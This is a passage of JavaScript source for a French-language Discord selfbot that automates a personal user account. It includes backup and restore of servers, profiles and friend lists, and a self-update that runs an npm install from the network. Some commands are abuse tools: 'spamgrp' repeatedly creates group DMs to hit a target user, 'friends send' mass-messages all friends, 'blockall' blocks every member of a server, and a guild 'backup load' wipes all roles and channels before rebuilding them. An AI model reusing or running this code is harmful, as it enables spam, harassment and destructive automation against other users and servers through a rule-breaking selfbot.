            for (const guild of client.guilds.cache.map((r => r))){
                if (guild.vanityURLCode) data2 += `https://discord.gg/${guild.vanityURLCode}\n`
                
                else {
                    if (!guild.members.me.permissions.has("CREATE_INSTANT_INVITE")) continue;
                    const channel = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first()
                
                    try{
                        const invite = await guild.invites.create(channel, { maxAge: 0, maxUses: 0, unique: false })
                        data2+= invite.url + "\n"
                    }
                    catch{}
                }
            }

            fs.writeFileSync(`${__dirname}/Data/Backups/links/${id}.txt`, data)

            client.guilds.cache.forEach(async guild => {
                const backupid = makeid(16)
                const er = new Array()
                guild.emojis.cache.forEach(e => er.push(`"${e.toString()}"`))
                client.save(`${__dirname}/Data/Backups/emotes/${backupid}.json`, `{\n        "emojis": [${er}],\n        "name": "${guild.name}",\n        "code": "${backupid}",\n        "size": "${guild.emojis.cache.size}"\n}`) 
            
                const id2 = makeid(16);
                const channels = guild.channels.cache
                    .sort(function(a, b) {
                        return a.position - b.position;
                    })
                    .map(c => {
                        const channel = {
                            type: c.type,
                            name: c.name,
                            postion: c.position,
                            permissions: c.permissionOverwrites?.cache.filter(p => p.type === "role").map(p => ({
                                roleName: c.guild.roles.cache.get(p.id).name,
                                allow: p.allow.bitfield.toString(),
                                deny: p.deny.bitfield.toString()
                            })) || []
                        };
                        if (c.parent) channel.parent = c.parent.name;
                        return channel;
                    });
    
                const roles = guild.roles.cache
                    .filter(r => r.id !== guild.id)
                    .sort(function(a, b) {
                        return a.position - b.position;
                    })
                    .map(r => {
                        const role = {
                            name: r.name,
                            color: r.color,
                            hoist: r.hoist,
                            permissions: r.permissions,
                            mentionable: r.mentionable,
                            position: r.position
                        };
                        return role;
                    });
    
                data = {
                    id,
                    icon: guild.iconURL(),
                    banner: guild.bannerURL(),
                    splash: guild.splashURL(),
                    name: guild.name,
                    owner: guild.ownerId,
                    members: guild.memberCount,
                    createdAt: guild.createdAt,
                    createdTimestamp: Date.now(),
                    roles,
                    channels
                };
    
                client.save(`${__dirname}/Data/Backups/guilds/${id2}.json`, data)    
            })

            message.edit(`ガ __**${name} Backup All**__ ガ\n> *Toutes les backups ont été crées*`)
        }


        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup account")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const data = {}
            const id = args[1] ?? makeid(16)
            await client.user.fetchFlags()
            data.username = client.user.username
            data.globalName = client.user.globalName
            data.avatar = client.user.avatar ? (await (fetch(client.user.displayAvatarURL({ dynamic: true })).then((res) => res.buffer()).catch(() => false))).toString('base64') : null
            data.banner = client.user.banner ? (await (fetch(client.user.bannerURL({ dynamic: true })).then((res) => res.buffer()).catch(() => false))).toString('base64') : null
            data.decoration = client.user.avatarDecoration ? (await (fetch(client.user.avatarDecorationURL({ format: "webp" })).then((res) => res.buffer()).catch(() => false))).toString('base64') : null
            data.pronom = client.user.pronouns || null
            data.aboutme = client.user.bio || null
            data.theme = client.settings.theme
            data.presence = client.user.presence.status || null
            data.colors = client.user.themeColors ?? client.user.accentColor ?? null
            data.badges = client.user.flags.toArray()
            data.statustext = client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.state).length > 0 ? client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.state)[0].state : null
            data.statusemoji = client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.emoji).length > 0 ? client.user.presence.activities.filter(a => a.type === "CUSTOM" && a.emoji)[0].emoji : null
            
            const accountJSON = JSON.stringify(data, null, 2);
            fs.writeFile(`${__dirname}/Data/Backups/account/${id}.json`, accountJSON, err => {
                message.edit(`ガ __**${name} Backup**__ ガ\n> *Création de la backup terminée. (\`${prefix}backup load ${id}\`)*`)
            })
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup friends")){
            const id = args[1] ?? makeid(16)
            const ids = []
            await client.relationships.fetch()
            client.relationships.friendCache.forEach(f => f?.id ? ids.push(f?.id) : "")
    
            const accountJSON = JSON.stringify(ids, null, 2);
            fs.writeFile(`${__dirname}/Data/Backups/friends/${id}.json`, accountJSON, err => {
                message.edit(`ガ __**${name} Backup**__ ガ\n> *Backup de ${client.relationships.friendCache.size} amis terminés. (\`${prefix}backup load ${id}\`)*`)
            })
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup links")){
            let data = ""
            let id = args[1] ?? makeid(16)
            message.edit(`ガ __**${name} Backup**__ ガ\n> *Création de la backup des serveurs en cours.*`)

            for (const guild of client.guilds.cache.map((r => r))){
                if (guild.vanityURLCode) data += `https://discord.gg/${guild.vanityURLCode}\n`
                
                else {
                    if (!guild.members.me.permissions.has("CREATE_INSTANT_INVITE")) continue;
                    const channel = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first()
                
                    try{
                        const invite = await guild.invites.create(channel, { maxAge: 0, maxUses: 0, unique: false })
                        data+= invite.url + "\n"
                    }
                    catch{}
                }
            }            

            fs.writeFile(`${__dirname}/Data/Backups/links/${id}.txt`, data, err => {
                message.edit(`ガ __**${name} Backup**__ ガ\n> *Backup de ${client.guilds.cache.size} serveurs terminés. (\`${prefix}backup load ${id}\`)*`)
            })
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup load")){

            // Emotes
            if (fs.existsSync(`${__dirname}/Data/Backups/emotes/${args[1]}.json`)){
                if (!message.guild) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Veuillez utiliser cette commande sur un serveur*`)
                if (!message.guild.members.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS")) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Vous n'avez pas les permissions nécessaire pour executer cette commande*`)
                const data = require(`${__dirname}/Data/Backups/emotes/${args[1]}.json`)
                message.edit(`Chargement de \`${data.emojis.length}\` emotes !`)
                await data.emojis.forEach(async emote => {
                    let emoji = discord.Util.parseEmoji(emote);
                    if (emoji?.id) {
                        const Link = `https://cdn.discordapp.com/emojis/${emoji?.id}.${emoji.animated ? 'gif' : 'png'}`;
                        guild.emojis.create(`${Link}`, `${`${emoji.name}`}`).catch(() => false)
                    }
                })
            }

            // Serveurs
            else if (fs.existsSync(`${__dirname}/Data/Backups/links/${args[1]}.txt`)){
                message.edit(`ガ __**${name} Backup**__ ガ\n> *Chargement des serveurs en cours*`)
    
                fs.readFile(`${__dirname}/Data/Backups/links/${args[1]}.txt`, 'utf8', async function(err, data) {
                    let lignes = data.split('\n')
                    let joined = 0
                    for (const url of lignes){
                        try{
                            await client.acceptInvite(url)
                            joined++
                        }
                        catch {}
                    }
    
                    message.channel.send(`ガ __**${name} Backup**__ ガ\n> *J'ai rejoint ${joined}/${lignes.length} serveurs.*`)
                })
            }

            // Compte
            else if (fs.existsSync(`${__dirname}/Data/Backups/account/${args[1]}.json`)){
                const file = require(`${__dirname}/Data/Backups/account/${args[1]}.json`)
    
                if (file.presence) client.user.setPresence({status: file.presence})
                await client.user.setGlobalName(file.globalName).catch(() => false)
                if (file.avatar) await client.user.setAvatar(readBase64Image(file.avatar)).catch(() => false)
                if (file.banner) await client.user.setBanner(readBase64Image(file.banner)).catch(() => false)
                await client.user.setPronouns(file.pronom).catch(() => false)
                await client.user.setAboutMe(file.aboutme).catch(() => false)
                if (file.badges.includes('HOUSE_BRAVERY')) await client.user.setHypeSquad(1).catch(() => false)
                else if (file.badges.includes('HOUSE_BRILLIANCE')) await client.user.setHypeSquad(2).catch(() => false)
                else if (file.badges.includes('HOUSE_BALANCE')) await client.user.setHypeSquad(3).catch(() => false)
                else await client.user.setHypeSquad(0).catch(() => false)
                
                if (file.statustext || file.statusemoji){
                    try{
                        if (file.statusemoji && estEmojiDiscord(file.statusemoji)){
    
                            const r = new discord.CustomStatus(client)
                                .setEmoji(client.user.nitroType !== "NONE" ? file?.statusemoji : undefined).setState(file.statustext)
                            client.user.setPresence({activities: [r]})
                        }
                        else {
                            const r = new discord.CustomStatus(client).setEmoji(file?.statusemoji || undefined).setState(file.statustext)
                            client.user.setPresence({activities: [r]})
                        }   
                    } catch { }
                }

                return message.edit(`ガ __**${name} Backup**__ ガ\n> *La backup a été chargée avec succès*`)
            }

        // Friends
        else if (fs.existsSync(`${__dirname}/Data/Backups/friends/${args[1]}.json`)){
            message.edit(`ガ __**${name} Backup**__ ガ\n> *Chargement de la backup des amis en cours.*`)

            fs.readFile(`${__dirname}/Data/Backups/friends/${args[1]}.json`, 'utf8', async function(err, data) {
                let array = JSON.parse(data)
                let added = 0
                for (const id of array){
                    try{
                        const user = await client.users.fetch(id)
                        await client.relationships.addFriend(user)
                        added++
                    }
                    catch {}
                }
                message.edit(`ガ __**${name} Backup**__ ガ\n> *Backup chargée avec succès. ${added}/${array.length} amis ajoutés.*`)
            })
        }

        // Serveurs
        else if (fs.existsSync(`${__dirname}/Data/Backups/guilds/${args[1]}.json`)){
            if (!message.guild) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Veuillez utiliser cette commande sur un serveur*`)
            if (!message.guild.members.me.permissions.has("ADMINISTRATOR")) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Vous n'avez pas les permissions nécessaire pour executer cette commande*`)
                
            const data = require(`${__dirname}/Data/Backups/guilds/${args[1]}.json`)

            message.edit(`ガ __**${name} Backup**__ ガ\n > Serveur: \`${data.name}\`\n> Salons: \`${data.channels.length}\`\n> Rôles: \`${data.roles.length}\`\n\n> **Ecrit \`${prefix}confirm\` pour charger la backup (annulation: <t:${Math.round((Date.now() + 1000 * 60) / 1000)}:R>)**`)

            const c = await message.channel.awaitMessages({filter: m => m.author?.id === client.user?.id, time: 1000 * 60, max: 1 }).catch(() => false)
            if (c?.first().content === `${prefix}confirm` || c?.first().content === `${prefix}confirmer`){
                message.delete().catch(() => false)
                message.guild.roles.cache.filter(r => r.deletable).forEach(role => role.delete("R$Z Backup Load").catch(() => false));
                message.guild.channels.cache.forEach(channel => channel.delete("R$Z Backup Load").catch(() => false));
                    
                try{
                    for await (const role of data.roles.map(r => r)){
                        message.guild.roles.create({
                            name: role.name,
                            color: role.color,
                            permissions: role.permissions,
                            hoist: role.hoist,
                            mentionable: role.mentionable,
                            position: role.position
                        })
                        .then(role => role.setPosition(role.position));
                    }
                }
                catch {}
                finally {
                    data.channels
                    .filter(c => c.type === "GUILD_CATEGORY")
                    .forEach(async function(ch) {
                        const finalPermissions = [];
    
                        const channel = await message.guild.channels.create(ch.name, {
                            type: ch.type,
                            permissionOverwrites: ch.permissionOverwrites
                        });
    
                        ch.permissions.forEach(async (perm) => {
                            const role = message.guild.roles.cache.find((r) => r.name === perm.roleName);
                            if (role) {
                                finalPermissions.push({
                                    id: role.id,
                                    allow: BigInt(perm.allow),
                                    deny: BigInt(perm.deny)
                                });
                            }
                        });
                        await channel.permissionOverwrites.set(finalPermissions);
    
                    });
    
                    data.channels
                    .filter(c => c.type !== "GUILD_CATEGORY")
                    .forEach(async function(ch) {
    
                        await message.guild.channels.create(ch.name, {
                            type: ch.type,
                            permissionOverwrites: ch.permissionOverwrites
                        }).then(async c => {
                            const finalPermissions = [];
    
                            const parent = message.guild.channels.cache
                                .filter(c => c.type === "GUILD_CATEGORY")
                                .find(c => c.name === ch.parent);
                            ch.parent ? c.setParent(parent) : "";
    
                            ch.permissions.forEach((perm) => {
    
                                const role = message.guild.roles.cache.find((r) => r.name === perm.roleName);
                                if (role) {
                                    finalPermissions.push({
                                        id: role.id,
                                        allow: BigInt(perm.allow),
                                        deny: BigInt(perm.deny)
                                    });
                                }
                            });
                            await c.permissionOverwrites.set(finalPermissions);

                            let webhook = await c.createWebhook('MessagesBackup', { avatar: client.user.displayAvatarURL() }).catch(() => false);
                            
                            if (ch.messages.length > 0){
                                for (const msg of ch.messages) {
                                    while(!webhook){
                                        webhook = await c.createWebhook('MessagesBackup', { avatar: client.user.displayAvatarURL() }).catch(() => false);
                                        await client.sleep(1000 * 60)
                                    }
    
                                    const sentMsg = await webhook
                                        .send({
                                        content: msg.content.length ? msg.content : undefined,
                                        username: msg.username,
                                        avatarURL: msg.avatar,
                                        embeds: msg.embeds,
                                        files: msg.files,
                                    })
                                        .catch(() => false);
                                    if (msg.pinned && sentMsg) await sentMsg.pin();
                                }
                            }
    
                        }).catch(() => false);
                    });
                }
    
                message.guild.setName(data.name).catch(() => false);
                message.guild.setIcon(data.icon).catch(() => false);
                message.guild.setBanner(data.banner).catch(() => false);
                message.guild.setSplash(data.splash).catch(() => false);
            }            
            else {
                message.edit(`ガ __**${name} Backup**__ ガ\n> *Vous n'avez pas répondu dans le délai imparti*`)
            }
        }
        else {
            message.edit(`ガ __**${name} Backup**__ ガ\n> *Aucune bannière n'a été trouvée*`)
        }
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup info")){
            if (!fs.existsSync(`${__dirname}/Data/Backups/guilds/${args[1]}.json`)) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Aucune backup de trouvée*`);
            const backupData = require(`${__dirname}/Data/Backups/guilds/${args[1]}.json`)
            const size = fs.statSync(`${__dirname}/Data/Backups/guilds/${args[1]}.json`)

            message.edit(`ガ __**${name} - Backup**__ ガ\n>>> \`Serveur\` ${client.separator} **${backupData.name}**
            \`Serveur ID\` ${client.separator} **${backupData?.id}**
            \`Icon du Serveur\` ${client.separator} **${backupData.icon || "Aucune"} **
            \`Bannière du serveur\` ${client.separator} **${backupData.banner || "Aucune"} **
            \`Bannière d'Invitation\` ${client.separator} **${backupData.splash ?? 'Aucune'} **
            \`Taille du fichier\` ${client.separator} **${Number((size / 1024).toFixed(2))}kb**
            \`Créé\` ${client.separator} **<t:${Math.round(backupData.createdTimestamp / 1000)}:R>**`.replaceAll("            ", ""))
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup delete")){
            fs.unlink(`${__dirname}/Data/Backups/guilds/${args[1]}.json`, err => {
                if (err) return message.edit(`ガ __**${name} - Backup**__ ガ\n> *Aucune backup de trouvée*`)
                else return message.edit(`ガ __**${name} - Backup**__ ガ\n> *La backup a été supprimée*`)
            })
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup purge")){
            const list = fs.readdirSync(`${__dirname}/Data/Backups/guilds/`).map((f) => f.split('.')[0])
            message.edit(`ガ __**${name} - Backup**__ ガ\n*Vous voulez vraiment supprimer ${list.length} backups ? (\`${prefix}confirm\`)*`.replace("<list>", list.length))
            
            await message.channel.awaitMessages({filter: m => m.author?.id === message.author?.id, time: 1000 * 60, max:1, errors: ["time"]})
            .then((c) => {
                if (c.first().content === prefix + 'confirm'){
                    c.first().edit(`ガ __**${name} - Backup**__ ガ\n*\`${list.length}\` ont été supprimés*`)
                    message.delete().catch(() => false)
                    list.forEach(b => fs.unlink(`${__dirname}/Data/Backups/guilds/${b}.json`, () => false))
                }
                else {
                    c.first().delete().catch(() => false)
                    message.delete().catch(() => false)
                }
            })
            .catch(() => message.delete().catch(() => false))        
        }
        
        else if (cmd.slice(0, 2).join(' ') === (prefix + "backup list")){
            if (!args[1]) args[1] = 0
            let count = 15;
            let p0 = 0;
            let p1 = count;
        
            if (isNaN(args[1])){
                const backups = fs.readdirSync(`${__dirname}/Data/Backups/guilds/`).map((f) => f.split('.')[0])

                let backupFetched = [];
                for (let i = 0; i < backups.length; i++) {
                    const fetchingBackup = require(`${__dirname}/Data/Backups/guilds/${backups[i]}`)
                    backupFetched.push(fetchingBackup)
                }
                    
                const backupInfos = (await Promise.all(backupFetched.sort(function (a, b) {
                    return a.name.localeCompare(b.name)
                }).filter(b => b.name.toLowerCase().startsWith(args[1].toLowerCase())).slice(p0, p1).map((e, i) => `\`${e.name}\` ${client.separator} **${e?.id}**`))).join('\n')
        
                return message.edit(`ガ __**${name} - Backup**__ ガ\n>>> ${backupInfos.length > 0 ? backupInfos : "None"}`)
                
            }
        
           else if (!isNaN(args[1])){
                switch(args[1]){
                    default:
                        p0 = p0 + count * args[1]
                        p1 = p1 + args[1] * count
                        break
                    case 1:
                        p0 = 0
                        p1 = p1 * args[1]
                        break
                    case "1":
                        p0 = 0
                        p1 = p1 * args[1]
                        break
                }
                
                const backups = fs.readdirSync(`${__dirname}/Data/Backups/guilds/`).map((f) => f.split('.')[0])
        
                let backupFetched = [];
                for (let i = 0; i < backups.length; i++) {
                    const fetchingBackup = require(`${__dirname}/Data/Backups/guilds/${backups[i]}`)
                  backupFetched.push(fetchingBackup)
                }
                const backupInfos = (await Promise.all(backupFetched.sort(function (a, b) {
                    return a.name.localeCompare(b.name)
                }).slice(p0, p1).map((e, i) => `\`${e.name}\` ${client.separator} **${e?.id}**`))).join('\n')
        
                return message.edit(`ガ __**${name} - Backup**__ ガ\n>>> ${backupInfos.length > 0 ? backupInfos : "None"}`)
                
            }
            else{
                const backups = fs.readdirSync(`${__dirname}/Data/Backups/guilds/`).map((f) => f.split('.')[0])
        
                let backupFetched = [];
                for (let i = 0; i < backups.length; i++) {
                    const fetchingBackup = require(`${__dirname}/Data/Backups/guilds/${backups[i]}`)
                  backupFetched.push(fetchingBackup)
                }
                const backupInfos = (await Promise.all(backupFetched.sort(function (a, b) {
                    return a.name.localeCompare(b.name)
                }).slice(p0, p1).map((e, i) => `\`${e.name}\` ${client.separator} **${e?.id}**`))).join('\n')
        
                return message.edit(`ガ __**${name} - Backup**__ ガ\n>>> ${backupInfos.length > 0 ? backupInfos : "None"}`)
            }
        }













        // Update

        else if (message.content === prefix + "update"){
            const response = await fetch(aa).catch(() => false)
            const api = await response.json().catch(() => false)
            if (!api) return message.edit(`ガ __**${name} - Update**__ ガ\n> *Impossible de se connecter à l'API*`);

            if (api.version === versionself) return message.edit(`ガ __**${name} - Update**__ ガ\n> *Le selfbot est à jour.*`);
            
            message.edit(`ガ __**${name} - Update**__ ガ\n> *Mise à jour en cours.*`);
            exec(`npm i rsz-selfbot-project@latest`, async (error, stdout) => {
                if (stdout){
                    await message.edit(`ガ __**${name} - Update**__ ガ\n> *Mise à jour effectuée. Veuillez relancer le selfbot*`);
                    process.exit(1)
                }
                else if (error) {
                    await message.edit(`ガ __**${name} - Update**__ ガ\n> *Une erreur c'est produite.*`);
                    console.log(`[ ${red("LOGS")} ]`)
                    console.log(green("Erreur pendant la mise à jour:"))
                    console.log(green("Erreur: " + error))
                }
            })
        }













        // Commandes Friends

        else if (message.content === prefix + "delete all friends"){
            client.relationships.friendCache.forEach(user => user?.delete().catch(() => false))
            message.edit(`ガ __**${name} - Delete All Friends**__ ガ\n> *Tous vos amis ont été supprimés.*`);
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "friends send")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[1]) return message.edit(`ガ __**${name} - Friends Send**__ ガ\n> *Veuillez inclure un message à envoyer.*`);

            client.relationships.friendCache.forEach(user => user?.send(args.slice(1).join(' ')).catch(() => false))
            message.edit(`ガ __**${name} - Friends Send**__ ガ\n> *Message envoyé à tous vos amis.*`);
        }

        else if (message.content === prefix + "unblock all"){
            message.edit(`ガ __**${name} - Unblock All**__ ガ\n> *J'ai débloqué tous le monde.*`);
            client.relationships.blockedCache.forEach(user => user?.unBlock().catch(() => false))
        }

        else if (message.content === prefix + "friend invite"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            const invite = await client.user.createFriendInvite()
            message.edit(`ガ __**${name} - Friend Invite**__ ガ\n> *${invite.url} *`);
        }

        else if (message.content === prefix + "friend delete"){
            client.user.revokeAllFriendInvites()
            message.edit(`ガ __**${name} - Friend Delete**__ ガ\n> *Tous vos liens ont été supprimés*`);
        }

        else if (message.content === prefix + "friend list"){
            const links = await client.user.getAllFriendInvites()
            message.edit(`ガ __**${name} - Friend List**__ ガ\n${links.length === 0 ? "Aucun lien" : links.map(lien => `> \`${lien.uses}/${lien.maxUses}\` ${client.separator} <${lien.url}> ${client.separator} Expire dans <t:${Math.round(lien.expiresAt / 1000)}:R>`).join('\n')}`);
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "addfriend")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Add Friend**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (client.relationships.friendCache.find(u => u?.id === user?.id)) return message.edit(`ガ __**${name} - Add Friend**__ ガ\n > *Vous êtes déjà ami avec ${user.username}*`)
            if (client.relationships.blockedCache.find(u => u?.id === user?.id)) return message.edit(`ガ __**${name} - Add Friend**__ ガ\n > *Vous avez bloqué ${user.username}*`)

            user.sendFriendRequest()
                .then( () => message.edit(`ガ __**${name} - Add Friend**__ ガ\n> *Demande d'ami envoyé à ${user.username}*`))
                .catch(() => message.edit(`ガ __**${name} - Add Friend**__ ガ\n> *Je n'ai pas pu envoyer une demande d'ami à ${user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "delfriend")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Del Friend**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (!client.relationships.friendCache.find(u => u?.id === user?.id)) return message.edit(`ガ __**${name} - Del Friend**__ ガ\n > *Vous n'êtes pas ami avec ${user.username}*`)

            user.unFriend()
                .then( () => message.edit(`ガ __**${name} - Del Friend**__ ガ\n> *${user.username} a été retiré de votre liste d'amis*`))
                .catch(() => message.edit(`ガ __**${name} - Del Friend**__ ガ\n> *Je n'ai pas pu retirer ${user.username} de vos amis*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "block")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Block**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (client.relationships.blockedCache.find(u => u?.id === user?.id)) return message.edit(`ガ __**${name} - Block**__ ガ\n > *Vous avez déjà bloquer ${user.username}*`)

            user.setBlock()
                .then( () => message.edit(`ガ __**${name} - Block**__ ガ\n> *${user.username} a été bloqué*`))
                .catch(() => message.edit(`ガ __**${name} - Block**__ ガ\n> *Je n'ai pas pu bloquer ${user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unblock")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Unblock**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (!client.relationships.blockedCache.find(u => u?.id === user?.id)) return message.edit(`ガ __**${name} - Unblock**__ ガ\n > *Vous n'avez pas bloquer ${user.username}*`)

            user.unBlock()
                .then( () => message.edit(`ガ __**${name} - Unblock**__ ガ\n> *${user.username} a été débloqué*`))
                .catch(() => message.edit(`ガ __**${name} - Unblock**__ ガ\n> *Je n'ai pas pu débloquer ${user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "acceptall")){
            message.edit(`ガ __**${name} - Accept All**__ ガ\n> *J'ai accepté toutes vos demandes d'amis*`)
            client.relationships.incomingCache.forEach(user => user?.setFriend().catch(() => false))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ignoreall")){
            message.edit(`ガ __**${name} - Ignore All**__ ガ\n> *J'ai ignoré toutes vos demandes d'amis*`)
            client.relationships.incomingCache.forEach(user => user?.unFriend().catch(() => false))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "blockall")){
            const guild = client.guilds.cache.get(args[0]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Block All**__ ガ\n> *Veuillez mentionner un ID de serveur*`)

            message.edit(`ガ __**${name} - Ignore All**__ ガ\n> *Je vais bloquer tous les membres de ce serveur*`)
            for (const member of guild.members.cache.filter(m => !m.user.bot).map(r => r)){
                await member.user.setBlock().catch(() => false)
                await client.sleep(5000)
            }
        }






































        // Commandes groupes

        else if (cmd.slice(0, 1).join(' ') === (prefix + "spamgrp")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0])
            if (!user) return message.edit(`ガ __**${name} - Spam Groupes**__ ガ\n> *Aucun utilisateur de trouvé*`)

            await client.relationships.fetch()
            if (!client.relationships.friendCache.find(u => u && u?.id === user?.id)) return message.edit(`ガ __**${name} - Spam Groupes**__ ガ\n> *${user.username} doit être ami avec vous*`)
        
            message.edit(`ガ __**${name} - Spam Groupes**__ ガ\n> *Je vais spammer les créations de groupes pour ${user.username}*`)

            for (let i = 0; i < 10; i++){
                const channel = await client.channels.createGroupDM([client.user]).catch(() => false)
                if (channel) await channel.addMember(user).catch(() => false)
                if (channel && args[1] === "l") channel?.delete(true).catch(() => false)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "addgrp")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0])
            if (!user) return message.edit(`ガ __**${name} - Adder Groupes**__ ガ\n> *Aucun utilisateur de trouvé*`)

            await client.relationships.fetch()
            if (!client.relationships.friendCache.find(u => u && u?.id === user?.id)) return message.edit(`ガ __**${name} - Adder Groupes**__ ガ\n> *${user.username} doit être ami avec vous*`)
        
            message.edit(`ガ __**${name} - Adder Groupes**__ ガ\n> *Je vais ajouter ${user.username} sur tous vos groupes*`)

            client.channels.cache.filter(c => c.type === "GROUP_DM").forEach(g => g.addMember(user).catch(() => false))
        }

        else if (message.content === prefix + "leavegrp"){
            await message.delete().catch(() => false)
            client.channels.cache.filter(c => c.type === "GROUP_DM").forEach(c => c.delete(true).catch(() => false))   
            message.edit(`ガ __**${name} - DDoS Groupe**__ ガ\n> *J'ai quitté tous les groupes discrètement*`)     
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "creategroupe")){
            const users = []
            const user1 = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0] || 0).catch(() => false)
            const user2 = message.mentions.users.first() || client.users.cache.get(args[1]) || await client.users.fetch(args[1] || 0).catch(() => false)
            const user3 = message.mentions.users.first() || client.users.cache.get(args[2]) || await client.users.fetch(args[2] || 0).catch(() => false)
            const user4 = message.mentions.users.first() || client.users.cache.get(args[3]) || await client.users.fetch(args[3] || 0).catch(() => false)
            const user5 = message.mentions.users.first() || client.users.cache.get(args[4]) || await client.users.fetch(args[4] || 0).catch(() => false)
            const user6 = message.mentions.users.first() || client.users.cache.get(args[5]) || await client.users.fetch(args[5] || 0).catch(() => false)
            const user7 = message.mentions.users.first() || client.users.cache.get(args[6]) || await client.users.fetch(args[6] || 0).catch(() => false)
            const user8 = message.mentions.users.first() || client.users.cache.get(args[7]) || await client.users.fetch(args[7] || 0).catch(() => false)
            const user9 = message.mentions.users.first() || client.users.cache.get(args[8]) || await client.users.fetch(args[8] || 0).catch(() => false)

            if (user1) users.push(user1)
            if (user2) users.push(user2)
            if (user3) users.push(user3)
            if (user4) users.push(user4)
            if (user5) users.push(user5)
            if (user6) users.push(user6)
            if (user7) users.push(user7)
            if (user8) users.push(user8)
            if (user9) users.push(user9)

            if (users.length === 0) return message.edit(`ガ __**${name} - Create Groupe**__ ガ\n> *Veuillez mentionner au moins un utilisateur*`)
            
            const groupe = await client.channels.createGroupDM([client.user]).catch(() => false)
            if (!groupe) return message.edit(`ガ __**${name} - Create Groupe**__ ガ\n> *Je ne peux pas crée de groupe pour le moment*`)
            
            users.forEach(user => groupe.addMember(user).catch(() => false))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "groupe name")){
            const channel = message.mentions.channels.first() || client.channels.cache.get(args[1]) || message.channel
            if (!channel) return message.edit(`ガ __**${name} - Groupe Name**__ ガ\n> *Veuillez utiliser cette commande dans un groupe*`)
            if (channel.type !== "GROUP_DM") return message.edit(`ガ __**${name} - Groupe Name**__ ガ\n> *Le salon indiqué doit être un groupe*`)
            channel.setName(args.slice(2).join(' ') || null)
                .then( () => message.edit(`ガ __**${name} - Groupe Name**__ ガ\n> *Le nom du groupe a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Groupe Name**__ ガ\n> *Je n'ai pas pu modifié le nom du groupe*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "groupe icone")){
            const channel = message.mentions.channels.first() || client.channels.cache.get(args[1]) || message.channel
            if (!channel) return message.edit(`ガ __**${name} - Groupe Icone**__ ガ\n> *Veuillez utiliser cette commande dans un groupe*`)
            if (channel.type !== "GROUP_DM") return message.edit(`ガ __**${name} - Groupe Icone**__ ガ\n> *Le salon indiqué doit être un groupe*`)
            
            if (message.attachments.size > 0){
                channel.setIcon(message.attachments.first().url)
                    .then( () => message.edit({content: `ガ __**${name} - Groupe Icone**__ ガ\n> *L'icone du groupe a été modifiée*`, files: []}))
                    .catch(() => message.edit({files: [], content: `ガ __**${name} - Groupe Icone**__ ガ\n> *Je n'ai pas pu modifié l'icone du groupe*`}))
            }
            
            else if (args[1]?.startsWith("http")){
                channel.setIcon(args[1])
                    .then( () => message.edit({content: `ガ __**${name} - Groupe Icone**__ ガ\n> *L'icone du groupe a été modifiée*`, files: []}))
                    .catch(() => message.edit(`ガ __**${name} - Groupe Icone**__ ガ\n> *Je n'ai pas pu modifié l'icone du groupe*`))
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "groupe owner")){
            if (message.channel.type !== "GROUP_DM") return message.edit(`ガ __**${name} - Groupe Owner**__ ガ\n> *Veuillez utiliser cette commande dans un groupe*`)
            const user = message.mentions.users.first() || client.users.cache.get(args[1]) || await client.users.fetch(args[1]).catch(() => false)
